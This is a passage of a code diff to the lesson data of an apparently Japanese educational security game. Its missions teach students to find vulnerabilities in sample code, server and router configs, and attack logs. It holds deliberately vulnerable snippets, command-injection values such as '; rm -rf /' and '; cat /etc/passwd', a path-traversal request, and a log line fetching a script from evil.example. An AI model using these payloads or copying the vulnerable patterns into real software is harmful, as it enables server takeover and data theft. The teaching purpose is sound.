-      { line: 3, name: "パスワード総当たり（ブルートフォース）②", why: "同上。", fix: "同上。" },
-      { line: 4, name: "パスワード総当たり（ブルートフォース）③", why: "同上。", fix: "同上。" },
-      { line: 6, name: "SQLインジェクションの試み",
-        why: "「' OR 1=1 --」はSQLインジェクションの定番。500エラーが出ているのでSQLが壊れた可能性がある。",
-        fix: "検索機能をプレースホルダで書き直す（ミッション1を思い出そう）。" },
-      { line: 7, name: "ディレクトリトラバーサル成功の疑い",
-        why: "「../../etc/passwd」へのアクセスが 200（成功）。重要ファイルが盗まれたかもしれない！最も緊急度が高い。",
-        fix: "すぐに機能を止め、ミッション5の対策を入れる。被害範囲を調査し報告する。" },
+    quizzes: [
+      { q: "アップロード機能の対策として正しくないものは？", choices: ["許可する拡張子を限定する", "保存するときの名前をランダムにする", "ファイルサイズに上限を設ける", "送られてきたファイル名をそのまま使う"], answer: 3, explain: "ファイル名は攻撃者が自由に決められます。サーバー側で安全な名前を付け直しましょう。" },
+      { q: "【試験風】攻撃者がWebサーバーに設置し、外部からブラウザなどを通じてサーバーを遠隔操作するための不正なプログラムはどれか。", choices: ["Webシェル", "Cookie", "WAF", "プロキシ"], answer: 0, explain: "アップロード機能の穴などから設置されることが多いです。" },
     ],
-    neutral: [],
-    hint: "攻撃は3種類、合計5行。同じIPから短時間に大量のアクセス、変な記号の入ったURLに注目。",
-    quiz: {
-      q: "攻撃の痕跡を見つけたホワイトハッカーがやるべきことは？",
-      choices: ["攻撃元のIPにやり返す", "ログを消して証拠を隠す", "記録を保存し、すぐ管理者に報告する", "SNSに書き込んで注意を呼びかける"],
-      answer: 2,
-      explain: "証拠（ログ）を保全して、責任者に速やかに報告するのが正しい対応です。やり返すのは違法になりえます。"
-    }
+    lesson: {
+      what: "画像や課題の提出など、ファイルを受け取る機能は攻撃者にとって「サーバーにファイルを置ける入口」です。チェックが甘いと、プログラムを置かれて実行されたり、巨大なファイルでサーバーを止められたりします。",
+      exampleLabel: "攻撃者がアップロードするファイルの例：",
+      example: "shell.php （中身はサーバーを操作するプログラム）\n↓ アップロード後に\nhttps://manabi.example.jp/uploads/shell.php にアクセス\n→ サーバー上でプログラムが動き、遠隔操作される（Webシェル）",
+      danger: "サーバーの乗っ取り、ウイルスの配布元にされる、他人のファイルの上書き、ディスクがいっぱいになってサービス停止。",
+      defense: [
+        "許可する拡張子を限定する（許可リスト方式）",
+        "拡張子や申告された種類だけでなく、ファイルの中身も確認する",
+        "保存するファイル名はサーバー側でランダムに付け直す",
+        "プログラムとして実行されない場所に保存する",
+        "ファイルサイズに上限を設ける",
+      ],
+      tip: "「禁止するものを並べる（拒否リスト）」より「許可するものだけを並べる（許可リスト）」の方が安全。セキュリティ全般で使える考え方です。",
+    },
+    examPoint: "Webシェル、DoS攻撃、そして「ホワイトリスト（許可リスト）方式とブラックリスト（拒否リスト）方式の違い」が出題されます。",
+    terms: [
+      { t: "Webシェル", d: "攻撃者がWebサーバーに設置し、外部から遠隔操作するための不正なプログラム。" },
+      { t: "DoS攻撃", d: "大量のデータやリクエストを送りつけて、サーバーやネットワークをサービスできない状態にする攻撃。複数の機器から行うものはDDoS攻撃。" },
+      { t: "ホワイトリスト方式", d: "許可するものだけを登録し、それ以外はすべて拒否する方式。許可リスト方式とも呼ぶ。" },
+    ],
+  },
+
+  /* ---------------- 11. OSコマンドインジェクション ---------------- */
+  {
+    id: "cmdi", name: "OSコマンドインジェクション", cat: "web",
+    story: "ブラックマンバの狙いはついにサーバーの乗っ取りへ。サーバーに命令を出す機能が一番危ない。",
+    variants: [
+      {
+        title: "ネットワーク診断ツールの診断", client: "依頼主：情報部の先輩", type: "Python",
+        scenario: "Webからpingを打てる便利ツールを作ったよ。ホスト名を入れると結果が表示されるんだ。",
+        lines: [
+          'import os',
+          '@app.route("/ping")',
+          'def ping():',
+          '    host = request.args.get("host")',
+          '    result = os.popen("ping -c 1 " + host).read()',
+          '    return "<pre>" + result + "</pre>"',
+        ],
+        vulns: [
+          { line: 4, name: "OSコマンドインジェクション", why: "host に「8.8.8.8; rm -rf /」のように「;」で別のコマンドを続けると、サーバー上で好きなコマンドを実行されてしまう。", fix: 'import subprocess, ipaddress\nip = ipaddress.ip_address(host)        # IPアドレスか検証\nsubprocess.run(["ping", "-c", "1", str(ip)], capture_output=True)' },
+          { line: 5, name: "出力をエスケープせず表示（XSS）", why: "コマンドの結果や入力がそのままHTMLとして返されるので、スクリプトを埋め込まれる可能性がある。", fix: 'from html import escape\nreturn "<pre>" + escape(result) + "</pre>"' },
+        ],
+        neutral: [3],
+        hint: "穴は2つ。シェルでは「;」や「&&」で複数のコマンドをつなげられる。",
+      },
+      {
+        title: "画像縮小ツールの診断", client: "依頼主：新聞部", type: "PHP",
+        scenario: "アップロード済みの画像を縮小するツールです。サイズは数字かどうかちゃんとチェックしています。",
+        lines: [
+          '<?php',
+          '// 画像を縮小するツール',
+          '$file = $_POST["filename"];',
+          '$size = $_POST["size"];',
+          'if (!preg_match("/^[0-9]+$/", $size)) exit("サイズは数字で入力");',
+          'system("convert uploads/$file -resize {$size}x{$size} thumbs/$file");',
+          'echo "完了しました";',
+        ],
+        vulns: [
+          { line: 5, name: "OSコマンドインジェクション", why: "サイズは検証しているが、ファイル名は何もチェックせずコマンドに埋め込んでいる。filename に「a.jpg; cat /etc/passwd」と入れられたら終わり。", fix: '$file = basename($file);\nif (!preg_match("/^[a-zA-Z0-9_-]+\\.(jpg|png)$/", $file)) exit;\nsystem("convert " . escapeshellarg("uploads/$file") . " ...");\n// 本当は画像ライブラリ（GDなど）を使い、OSコマンドを使わないのが一番' },
+        ],
+        neutral: [2],
+        hint: "5行目の検証は正しい。でも入力は2つあるよね？",
+      },
+    ],
+    quizzes: [
+      { q: "OSコマンドインジェクション対策として良いのは？", choices: ["シェルを使わず、引数をリストで渡す＋入力を検証する", "コマンド名を大文字にする", "pingの回数を増やす", "結果を画像で返す"], answer: 0, explain: "シェルを経由しないと「;」などの特殊記号が解釈されません。さらに入力の形式を検証すると安心です。" },
+      { q: "【試験風】OSコマンドインジェクションの対策として最も適切なものはどれか。", choices: ["外部からの入力をOSコマンドに渡す処理を、できるだけ使わない実装にする", "通信をSSL/TLSで暗号化する", "パスワードの最低文字数を増やす", "ログイン失敗時にアカウントをロックする"], answer: 0, explain: "暗号化やパスワード対策は別の攻撃への対策です。OSコマンドを呼ばない実装が根本対策です。" },
+    ],
+    lesson: {
+      what: "プログラムの中からサーバーのOSのコマンド（ping、ls など）を呼び出すとき、入力に別のコマンドを混ぜて、攻撃者の好きなコマンドを実行させる攻撃です。",
+      exampleLabel: "ホスト名の欄にこう入力すると…",
+      example: "8.8.8.8; cat /etc/passwd\n\n→ 実行されるのは「ping -c 1 8.8.8.8; cat /etc/passwd」\n→ ; の後ろも別のコマンドとして実行される\n※ ; && | ` $( ) などがコマンドをつなぐ特殊な記号",
+      danger: "サーバー上でどんなコマンドでも実行できる＝サーバーの乗っ取り。ファイルの削除、ウイルスの設置、他への攻撃の踏み台など、被害はとても大きい。",
+      defense: [
+        "そもそもOSコマンドを使わず、プログラミング言語のライブラリで代わりにする",
+        "使う場合はシェルを通さず、引数をリストで渡す",
+        "入力が正しい形式（IPアドレスなど）か、許可リストで検証する。入力が複数ある場合は全部",
+        "プログラムを最小限の権限で動かす",
+      ],
+      tip: "SQLインジェクション・XSS・コマンドインジェクションは、どれも「データのつもりの入力が、命令として解釈される」という同じ仕組みの仲間です。",
+    },
+    examPoint: "「インジェクション」系の攻撃名と、その攻撃で実行されるもの（SQL文・スクリプト・OSコマンド）の対応を整理しておきましょう。",
+    terms: [
+      { t: "OSコマンドインジェクション", d: "入力に不正なOSコマンドを混ぜて、サーバー上で実行させる攻撃。" },
+      { t: "踏み台", d: "攻撃者が乗っ取ったコンピュータを中継して、別の相手を攻撃すること。攻撃者の正体を隠すのに使われる。" },
+    ],
+  },
+
+  /* ---------------- 12. 秘密情報の管理 ---------------- */
+  {
+    id: "secrets", name: "秘密情報の管理", cat: "human",
+    story: "サーバーへの侵入口はほぼふさいだ。だが、そもそも「鍵」が落ちていたら意味がない。開発チームのコードを調べよう。",
+    variants: [
+      {
+        title: "アプリ設定ファイルの診断", client: "依頼主：学校お知らせアプリ開発チーム", type: "JavaScript",
+        scenario: "このconfig.jsはブラウザ（利用者のスマホ）にそのまま配信されます。",
+        lines: [
+          '// config.js（ブラウザに配信される）',
+          'const API_BASE    = "https://api.manabi-app.jp";',
+          'const API_KEY     = "sk_live_9f8a7b6c5d4e3f2a1b";',
+          'const DB_PASSWORD = "P@ssw0rd2024";',
+          'function fetchNews() {',
+          '  return fetch(API_BASE + "/news?key=" + API_KEY);',
+          '}',
+        ],
+        vulns: [
+          { line: 2, name: "APIキーのハードコード", why: "ブラウザに配られるファイルは誰でも中身を見られる。本番用（live）の秘密キーが盗まれ、なりすましや高額請求に使われる。", fix: "// 秘密キーはサーバー側の環境変数に置き、\n// ブラウザ → 自分のサーバー → 外部API の順で中継する" },
+          { line: 3, name: "DBパスワードの埋め込み", why: "データベースのパスワードが丸見え。しかも推測されやすい。", fix: "// DBのパスワードはサーバー側だけで管理。フロントには絶対に置かない" },
+        ],
+        neutral: [5],
+        hint: "ブラウザの「開発者ツール」を開けば、このファイルは誰でも読める。",
+      },
+      {
+        title: "Gitリポジトリの診断", client: "依頼主：部活動アプリ開発チーム", type: "Git",
+        scenario: "GitHubに公開しているリポジトリです。「.envは後で消したから大丈夫」とのこと。調べてみましょう。",
+        lines: [
+          '$ git log --oneline',
+          'a1b2c3d 不要なファイルを削除',
+          'd4e5f6a .envを追加（あとで消す）',
+          '9f8e7d6 最初のコミット',
+          '$ cat .gitignore',
+          'node_modules/',
+          '$ git show d4e5f6a:.env',
+          'DB_PASSWORD=manabi2024!',
+          'MAIL_API_KEY=mk_live_7c6b5a4f3e2d',
+        ],
+        vulns: [
+          { line: 2, name: "秘密情報をコミット", why: "あとで削除しても、Gitの履歴には残り続ける。公開リポジトリなら誰でも取り出せる。", fix: "# 漏れたキーとパスワードはすぐに無効化・変更する\n# 履歴からの削除はそのあと（git filter-repo など）" },
+          { line: 5, name: ".gitignoreに.envがない", why: "これでは再び .env をうっかりコミットしてしまう。", fix: "node_modules/\n.env" },
+          { line: 7, name: "DBパスワードが履歴から読める", why: "過去のコミットを見るだけで、データベースのパスワードが分かる。", fix: "パスワードを変更する。" },
+          { line: 8, name: "APIキーが履歴から読める", why: "本番用のメール送信キー。スパムメールの大量送信などに悪用される。", fix: "キーを無効化して新しく発行する。" },
+        ],
+        neutral: [1, 6],
+        hint: "Gitは過去の状態をすべて覚えている。そして「次にコミットするとき」も危ないかも？",
+      },
+    ],
+    quizzes: [
+      { q: "ソースコードに秘密情報を書いてGitHubに公開してしまった！まずやるべきことは？", choices: ["ファイルからその行を消してコミットすれば大丈夫", "すぐにキーやパスワードを無効化・変更する", "リポジトリの名前を変える", "誰も見てないはずなので放置"], answer: 1, explain: "公開された瞬間に自動で収集されることもあります。履歴にも残るので、行を消すだけでは不十分。まずキー自体を無効化しましょう。" },
+      { q: "【試験風】プログラムの中に、パスワードなどの値を直接書き込むことを何というか。", choices: ["ハードコーディング", "リファクタリング", "コンパイル", "デバッグ"], answer: 0, explain: "直接書き込むことをハードコーディングと呼びます。秘密情報のハードコーディングは避けましょう。" },
+    ],
+    lesson: {
+      what: "APIキーやパスワードなどの秘密情報を、ソースコードに直接書き込むこと（ハードコード）は危険です。ブラウザで動くJavaScriptやスマホアプリは利用者の手元に配られるので、中身を誰でも見ることができます。また、Gitに一度コミットした情報は、削除しても履歴に残り続けます。",
+      exampleLabel: "ブラウザで誰でもできること：",
+      example: "F12キー（開発者ツール）→「Sources」タブ\n→ 配信された config.js の中身がそのまま読める\n→ const API_KEY = \"sk_live_...\" も丸見え\n\nGitの場合：\ngit log で過去のコミットを探す → git show で当時のファイルを表示",
+      danger: "キーを使ってなりすまされる、有料APIを勝手に使われて高額請求が来る、データベースに侵入される など。GitHubに公開すると、自動で探すプログラムに数分で見つけられることもある。",
+      defense: [
+        "秘密情報はサーバー側の環境変数やシークレット管理サービスに置く",
+        "ブラウザ・アプリ → 自分のサーバー → 外部API の順で中継する",
+        ".gitignore で .env などの設定ファイルをGitに含めない",
+        "漏れたら、まずキーやパスワードを無効化・変更する（行を消すだけでは履歴に残る）",
+      ],
+      tip: "Gitは過去の履歴をすべて覚えています。一度コミットした秘密情報は「漏れたもの」として扱いましょう。",
+    },
+    examPoint: "情報漏えい時の対応手順や、機密情報の管理（アクセス権・暗号化・持ち出し制限）がよく問われます。",
+    terms: [
+      { t: "ハードコーディング", d: "設定値やパスワードなどを、プログラムの中に直接書き込むこと。" },
+      { t: "環境変数", d: "プログラムの外側（OS）に設定しておく値。秘密情報をコードから分けて管理するのに使う。" },
+    ],
+  },
+
+  /* ---------------- 13. サーバー設定 ---------------- */
+  {
+    id: "server", name: "サーバーの設定ミス", cat: "infra",
+    story: "アプリはだいぶ安全になった。最後に、アプリを動かしている土台――サーバーそのものの設定を確認しよう。",
+    variants: [
+      {
+        title: "サーバー設定ファイルの診断", client: "依頼主：まなび高校 情報担当", type: "設定ファイル",
+        scenario: "学校のWebサーバーを新しく立てました。設定ファイルをチェックしてください。",
+        lines: [
+          '# server.conf',
+          'server_name           = manabi-web',
+          'listen_port           = 80',
+          'debug_mode            = true',
+          'admin_user            = admin',
+          'admin_password        = admin',
+          'ssh_port              = 22',
+          'ssh_permit_root_login = yes',
+          'allow_ip              = 0.0.0.0/0',
+          'log_level             = info',
+        ],
+        vulns: [
+          { line: 3, name: "デバッグモードが有効", why: "エラー時に内部の情報（ソースコードやパス、設定）が外部に丸見えになる。本番では必ずオフ。", fix: "debug_mode = false" },
+          { line: 5, name: "初期パスワードのまま", why: "admin / admin は攻撃者が真っ先に試す組み合わせ。", fix: "admin_password = （長くて推測されにくいパスワード）" },
+          { line: 7, name: "rootでのSSHログインを許可", why: "最強の権限を持つrootに直接ログインを試され続ける。破られたら全てを奪われる。", fix: "ssh_permit_root_login = no\n# 一般ユーザー＋鍵認証でログインし、必要なときだけ権限を上げる" },
+          { line: 8, name: "全世界からのアクセスを許可", why: "0.0.0.0/0 は「すべてのIPアドレス」。管理機能まで世界中から触れてしまう。", fix: "allow_ip = 192.168.10.0/24   # 校内ネットワークだけ" },
+        ],
+        neutral: [2, 4, 6],
+        hint: "穴は4つ。「開発用の設定」「初期値」「権限」「誰が接続できるか」。",
+      },
+      {
+        title: "Webサーバー（nginx）設定の診断", client: "依頼主：まなび高校 情報担当", type: "nginx設定",
+        scenario: "学校ホームページのWebサーバー設定です。公開してはいけないものまで公開していないか確認してください。",
+        lines: [
+          'server {',
+          '    listen 80;',
+          '    server_name manabi.example.jp;',
+          '    root /var/www/html;',
+          '    autoindex on;',
+          '    server_tokens on;',
+          '    location /backup/ { allow all; }',
+          '    location /.git/   { allow all; }',
+          '    error_page 404 /404.html;',
+          '}',
+        ],
+        vulns: [
+          { line: 1, name: "暗号化なし（HTTPのみ）", why: "HTTPSになっていないので、通信内容（パスワードやCookie）を盗み見られる。", fix: "listen 443 ssl;\n# 80番はHTTPSへ転送する" },
+          { line: 4, name: "ファイル一覧が見える", why: "autoindex on だと、フォルダの中身が一覧で表示され、置いてあるファイルを全部知られてしまう。", fix: "autoindex off;" },
+          { line: 5, name: "バージョン情報を公開", why: "ソフトのバージョンが分かると、そのバージョンの既知の脆弱性を狙われやすい。", fix: "server_tokens off;" },
+          { line: 6, name: "バックアップを公開", why: "バックアップにはデータベースや設定ファイルがそのまま入っていることが多い。", fix: "location /backup/ { deny all; }   # そもそも公開フォルダに置かない" },
+          { line: 7, name: ".gitフォルダを公開", why: ".gitからソースコードや過去の履歴（秘密情報含む）を丸ごと復元できる。", fix: "location ~ /\\. { deny all; }   # ドットで始まるものは全部拒否" },
+        ],
+        neutral: [3],
+        hint: "穴は5つ。暗号化、一覧表示、バージョン、そして公開してはいけないフォルダ。",
+      },
+    ],
+    quizzes: [
+      { q: "サーバーを公開する前にやるべきことでないものは？", choices: ["初期パスワードを変更する", "デバッグモードを切る", "不要なアクセスを制限する", "管理者パスワードを全員に共有する"], answer: 3, explain: "パスワードの共有は危険です。誰が何をしたか追えなくなり、漏れる可能性も高くなります。" },
+      { q: "【試験風】ソフトウェアの脆弱性が発見され、修正プログラムが提供される前に、その脆弱性を悪用して行われる攻撃はどれか。", choices: ["ゼロデイ攻撃", "水飲み場型攻撃", "標的型攻撃", "リプレイ攻撃"], answer: 0, explain: "修正（パッチ）の提供日を1日目として、それより前（0日目）の攻撃なのでゼロデイ攻撃と呼びます。" },
+    ],
+    lesson: {
+      what: "プログラム自体に問題がなくても、設定を間違えるだけで大きな穴が開きます。Webの脆弱性ランキング「OWASP Top 10」でも上位に入る、とても多い原因です。",
+      exampleLabel: "よくある設定ミスの例：",
+      example: "・admin / admin などの初期パスワードのまま\n・開発用のデバッグモードが本番でもオン\n・使っていないサービスやポートが開きっぱなし\n・管理画面に世界中からアクセスできる（0.0.0.0/0）\n・最強権限の root で直接ログインできる\n・ファイル一覧やバックアップ、.git が公開されている",
+      danger: "初期パスワードはネットで調べればすぐ分かるので、自動プログラムで大量に狙われる。デバッグ画面やバージョン情報から、内部の情報や狙うべき弱点を知られてしまう。",
+      defense: [
+        "公開前にチェックリストで設定を確認する",
+        "初期パスワードは必ず変更する",
+        "必要な人に、必要な権限だけを与える（最小権限の原則）",
+        "不要な機能・サービス・ファイルは公開しない",
+        "定期的に設定を見直し、ソフトウェアをアップデート（パッチを適用）する",
+      ],
+      tip: "2016年には、初期パスワードのままの防犯カメラやルーターが「Mirai」というウイルスに大量に乗っ取られ、大規模な攻撃に使われました。",
+    },
+    examPoint: "ゼロデイ攻撃、セキュリティパッチ、脆弱性診断（ペネトレーションテスト）など、運用に関する用語がよく出ます。",
+    terms: [
+      { t: "ゼロデイ攻撃", d: "脆弱性が見つかってから、修正プログラム（パッチ）が提供される前に、その脆弱性を悪用する攻撃。" },
+      { t: "セキュリティパッチ", d: "ソフトウェアの脆弱性を修正するためのプログラム。" },
+      { t: "ペネトレーションテスト", d: "実際に攻撃者と同じ手法でシステムに侵入を試み、脆弱性がないかを確かめる検査。侵入テスト。" },
+      { t: "ポートスキャン", d: "サーバーのどのポート（通信の出入口）が開いているかを調べること。攻撃の下調べに使われる。" },
+    ],
+  },
+
+  /* ---------------- 14. ネットワーク ---------------- */
+  {
+    id: "network", name: "ネットワークとWi-Fi", cat: "infra",
+    story: "サーバーは守った。だがブラックマンバは、校内のネットワークに直接入り込もうとしている。ルーターとWi-Fiを調べよう。",
+    variants: [
+      {
+        title: "校内Wi-Fiルーターの診断", client: "依頼主：まなび高校 情報担当", type: "ルーター設定",
+        scenario: "職員室にある無線LANルーターの設定画面です。生徒も来客も使っています。",
+        lines: [
+          '[無線LANルーター設定] 校内Wi-Fi',
+          'SSID               : manabi-school',
+          '暗号化方式         : WEP',
+          'Wi-Fiパスワード    : 12345678',
+          '管理画面パスワード : password',
+          'ファームウェア     : v1.0.2（2017年から未更新）',
+          'ゲストWi-Fi        : 職員用ネットワークと同じ',
+          'WPS                : 無効',
+        ],
+        vulns: [
+          { line: 2, name: "古い暗号化方式（WEP）", why: "WEPは数分で解読できてしまう。通信内容が丸見えになる。", fix: "暗号化方式 : WPA3（使えなければWPA2）" },
+          { line: 3, name: "推測されやすいWi-Fiパスワード", why: "12345678 はよく使われるパスワードの代表。誰でも入れてしまう。", fix: "長くランダムなパスワードにする" },
+          { line: 4, name: "管理画面のパスワードが弱い", why: "管理画面に入られると、設定を全部変えられてしまう。", fix: "初期パスワードから変更し、長く推測されにくいものにする" },
+          { line: 5, name: "ファームウェアが古い", why: "何年も更新されておらず、既知の脆弱性が残っている。", fix: "最新版に更新する。サポートが終わった機器は買い替える" },
+          { line: 6, name: "ゲストと職員が同じネットワーク", why: "来客や生徒のスマホから、職員のPCや成績サーバーに直接アクセスできてしまう。", fix: "ゲスト用は別のネットワーク（VLANなど）に分けて、インターネットだけ使えるようにする" },
+        ],
+        neutral: [1],
+        hint: "穴は5つ。暗号の強さ、2つのパスワード、更新状況、ネットワークの分け方。",
+      },
+      {
+        title: "ルーターのアクセス制御の診断", client: "依頼主：まなび高校 ネットワーク担当", type: "ルーター設定（ACL）",
+        scenario: "インターネットから校内への通信を制限するアクセスリスト（ACL）と、ルーターへのリモートログインの設定です。Webサーバー（.10）だけを外部に公開したい、とのこと。",
+        lines: [
+          '! インターネット → 校内 のアクセスリスト',
+          'access-list 100 permit tcp any host 192.168.1.10 eq 80',
+          'access-list 100 permit tcp any host 192.168.1.10 eq 443',
+          'access-list 100 permit tcp any host 192.168.1.20 eq 3306',
+          'access-list 100 permit tcp any any eq 23',
+          'access-list 100 permit ip any any',
+          '!',
+          'line vty 0 4',
+          ' transport input telnet',
+          ' password cisco',
+        ],
+        vulns: [
+          { line: 3, name: "データベースを外部に公開", why: "3306番はMySQL（データベース）。インターネットから直接データベースに接続を試せてしまう。", fix: "この行を削除（DBは校内のWebサーバーからだけ使えればよい）" },
+          { line: 4, name: "Telnetを外部に公開", why: "23番はTelnet。通信が暗号化されず、パスワードも盗み見られる。", fix: "この行を削除" },
+          { line: 5, name: "すべての通信を許可", why: "最後に「全部許可」があると、ここまでの制限が意味をなさない。ACLの最後は「全部拒否」が基本。", fix: "この行を削除（ACLは最後に暗黙の deny any any がある）" },
+          { line: 8, name: "リモートログインにTelnetを使用", why: "Telnetは平文なので、管理者のログイン情報を盗聴される。", fix: " transport input ssh" },
+          { line: 9, name: "弱いパスワード（平文保存）", why: "機器名そのままの推測されやすいパスワード。設定ファイルにも平文で残る。", fix: " login local   # ユーザー名＋強いパスワード（secret で暗号化保存）" },
+        ],
+        neutral: [0, 7],
+        hint: "公開したいのはWebサーバーの80番と443番だけ。それ以外の許可、そして管理用ログインの方法をチェック。",
+      },
+    ],
+    quizzes: [
+      { q: "フリーWi-Fiを使うときに気をつけることとして正しいのは？", choices: ["暗号化されていないWi-Fiで個人情報を入力しない", "どのWi-Fiでも同じなので気にしない", "Wi-Fiのパスワードを友達にSNSで教える", "自動接続をオンにしておく"], answer: 0, explain: "暗号化されていなかったり、偽物のアクセスポイントだったりすると、通信を盗み見られる危険があります。" },
+      { q: "【試験風】インターネットと内部ネットワークの間に設け、外部に公開するWebサーバーなどを置くための、どちらからも隔離されたネットワーク領域はどれか。", choices: ["DMZ", "VPN", "DNS", "NAT"], answer: 0, explain: "DMZ（非武装地帯）に公開サーバーを置くことで、万一乗っ取られても内部ネットワークへの被害を防ぎやすくなります。" },
+    ],
+    lesson: {
+      what: "ネットワーク機器（ルーター・Wi-Fi）の設定が甘いと、外部の人が校内のネットワークに入り込み、中にあるパソコンやサーバーを直接狙えるようになります。どの通信を通し、どれを止めるかを決める仕組みがファイアウォールやACL（アクセスコントロールリスト）です。",
+      exampleLabel: "よく出てくるポート番号：",
+      example: "22  … SSH（暗号化されたリモートログイン）\n23  … Telnet（暗号化なしのリモートログイン → 使わない）\n80  … HTTP（暗号化なしのWeb）\n443 … HTTPS（暗号化されたWeb）\n3306 … MySQL（データベース → 外部に公開しない）\n\nWi-Fiの暗号化：WEP（危険）＜ WPA ＜ WPA2 ＜ WPA3（推奨）",
+      danger: "通信の盗聴、校内のパソコンやサーバーへの侵入、ルーターの乗っ取り。来客用Wi-Fiが職員用と同じだと、成績サーバーまで届いてしまう。",
+      defense: [
+        "Wi-FiはWPA2/WPA3で暗号化し、強いパスワードを使う",
+        "機器の初期パスワードを変更し、ファームウェアを最新にする",
+        "ゲスト用と職員用などで、ネットワークを分ける（VLAN）",
+        "必要な通信だけを許可し、それ以外は拒否する（ACL・ファイアウォール）",
+        "公開サーバーはDMZに置き、内部ネットワークと分ける",
+        "リモートログインはTelnetではなくSSHを使う",
+      ],
+      tip: "CCNAで学ぶACLやVLANの知識は、そのままセキュリティ対策になります。CCNAの勉強とセットで覚えると効率的です。",
+    },
+    examPoint: "ファイアウォール、DMZ、VPN、WPA2/WPA3 は頻出。ポート番号（22・23・25・80・443など）も覚えておくと得点源になります。",
+    terms: [
+      { t: "ファイアウォール", d: "ネットワークの境界で通信を監視し、決められたルールに従って通過させたり遮断したりする仕組み。" },
+      { t: "DMZ", d: "インターネットと内部ネットワークの間に設ける隔離されたネットワーク領域。公開サーバーを置く。非武装地帯。" },
+      { t: "VPN", d: "インターネット上に暗号化された仮想的な専用回線を作り、安全に通信する技術。" },
+      { t: "WPA3", d: "無線LAN（Wi-Fi）の暗号化方式の最新規格。古いWEPは簡単に解読されるため使わない。" },
+      { t: "ACL", d: "アクセスコントロールリスト。ルーターなどで、どの通信を許可・拒否するかを並べたリスト。" },
+      { t: "SSH", d: "通信を暗号化して、遠隔のコンピュータに安全にログインするための仕組み。暗号化しないTelnetの代わりに使う。" },
+    ],
+  },
+
+  /* ---------------- 15. ログ解析 ---------------- */
+  {
+    id: "logs", name: "ログ解析とインシデント対応", cat: "ops",
+    story: "最終決戦。学校のサーバーに、ブラックマンバが侵入した形跡がある…！ ログから奴らの足取りをすべて突き止めろ！",
+    variants: [
+      {
+        title: "Webアクセスログの調査", client: "依頼主：まなび高校 情報担当（緊急）", type: "アクセスログ",
+        scenario: "Webサーバーの様子がおかしい！アクセスログから攻撃の痕跡を全部見つけてください。",
+        lines: [
+          '10.0.0.5     [05/Nov 09:00:01] "GET /index.html" 200',
+          '10.0.0.8     [05/Nov 09:00:03] "GET /news" 200',
+          '203.0.113.9  [05/Nov 09:01:10] "POST /login user=admin" 401',
+          '203.0.113.9  [05/Nov 09:01:10] "POST /login user=admin" 401',
+          '203.0.113.9  [05/Nov 09:01:11] "POST /login user=admin" 401',
+          '10.0.0.5     [05/Nov 09:02:00] "GET /about" 200',
+          '198.51.100.4 [05/Nov 09:03:15] "GET /search?q=\' OR 1=1 --" 500',
+          '198.51.100.4 [05/Nov 09:03:20] "GET /download?file=../../etc/passwd" 200',
+          '10.0.0.8     [05/Nov 09:04:00] "GET /contact" 200',
+        ],
+        vulns: [
+          { line: 2, name: "パスワード総当たり①", why: "同じIPから1秒間に何度もadminへのログイン失敗（401）。機械で総当たりしている。", fix: "ログイン失敗が続いたらロック・待ち時間を入れる。多要素認証を導入する。" },
+          { line: 3, name: "パスワード総当たり②", why: "同じIPからの連続したログイン失敗。", fix: "同上。" },
+          { line: 4, name: "パスワード総当たり③", why: "同じIPからの連続したログイン失敗。", fix: "同上。" },
+          { line: 6, name: "SQLインジェクションの試み", why: "「' OR 1=1 --」はSQLインジェクションの定番。500エラーが出ているのでSQLが壊れた可能性がある。", fix: "検索機能をプレースホルダで書き直す。" },
+          { line: 7, name: "ディレクトリトラバーサル成功の疑い", why: "「../../etc/passwd」へのアクセスが 200（成功）。重要ファイルが盗まれたかもしれない！最も緊急度が高い。", fix: "すぐに機能を止め、対策を入れる。被害範囲を調査し報告する。" },
+        ],
+        neutral: [],
+        hint: "攻撃は3種類、合計5行。同じIPから短時間に大量のアクセス、変な記号の入ったURLに注目。",
+      },
+      {
+        title: "サーバーのログイン記録の調査", client: "依頼主：まなび高校 情報担当（緊急）", type: "認証ログ",
+        scenario: "朝来たら、サーバーのアクセスログが消えていた！ログイン記録（auth.log）から、夜中に何が起きたか突き止めてください。",
+        lines: [
+          'Nov  5 02:10:01 sshd: Accepted publickey for teacher from 10.0.0.12',
+          'Nov  5 02:14:22 sshd: Failed password for root from 45.33.10.8',
+          'Nov  5 02:14:23 sshd: Failed password for root from 45.33.10.8',
+          'Nov  5 02:14:24 sshd: Failed password for invalid user test from 45.33.10.8',
+          'Nov  5 02:15:10 sshd: Accepted password for admin from 45.33.10.8',
+          'Nov  5 02:15:40 sudo: admin : COMMAND=/usr/bin/wget http://evil.example/x.sh',
+          'Nov  5 02:16:02 sudo: admin : COMMAND=/bin/rm /var/log/nginx/access.log',
+          'Nov  5 08:30:15 sshd: Accepted publickey for teacher from 10.0.0.12',
+        ],
+        vulns: [
+          { line: 1, name: "総当たり攻撃①", why: "外部のIPからrootへのログイン失敗が1秒おきに続いている。", fix: "rootログインを禁止し、パスワード認証をやめて鍵認証にする。" },
+          { line: 2, name: "総当たり攻撃②", why: "同じIPからの連続したログイン失敗。", fix: "同上。" },
+          { line: 3, name: "総当たり攻撃③", why: "存在しないユーザー名（test）まで試している。機械的な攻撃の証拠。", fix: "同上。" },
+          { line: 4, name: "侵入成功", why: "総当たりしていたIPから、adminでパスワードログインに成功している。侵入された！", fix: "adminのパスワードを即変更し、侵入後の操作を調べる。" },
+          { line: 5, name: "不審なプログラムのダウンロード", why: "侵入者が管理者権限で外部から怪しいスクリプトをダウンロードしている。", fix: "ダウンロードされたファイルを調査し、ネットワークから隔離する。" },
+          { line: 6, name: "ログの削除（証拠隠滅）", why: "侵入者がアクセスログを消して、足跡を隠そうとしている。", fix: "ログは別のサーバーにも転送して保存しておく。" },
+        ],
+        neutral: [0],
+        hint: "失敗の連続のあとに何が起きた？侵入者はそのあと何をした？",
+      },
+    ],
+    quizzes: [
+      { q: "攻撃の痕跡を見つけたホワイトハッカーがやるべきことは？", choices: ["攻撃元のIPにやり返す", "ログを消して証拠を隠す", "記録を保存し、すぐ管理者に報告する", "SNSに書き込んで注意を呼びかける"], answer: 2, explain: "証拠（ログ）を保全して、責任者にすぐ報告するのが正しい対応です。やり返すのは違法になることもあります。" },
+      { q: "【試験風】組織内に設置され、セキュリティインシデントの報告を受け付けて対応にあたる専門チームはどれか。", choices: ["CSIRT", "ISMS", "SOC 2", "JPCERT"], answer: 0, explain: "CSIRT（シーサート）は組織のインシデント対応チームです。JPCERT/CCは日本全体の調整機関、ISMSは情報セキュリティマネジメントの仕組みです。" },
+    ],
+    lesson: {
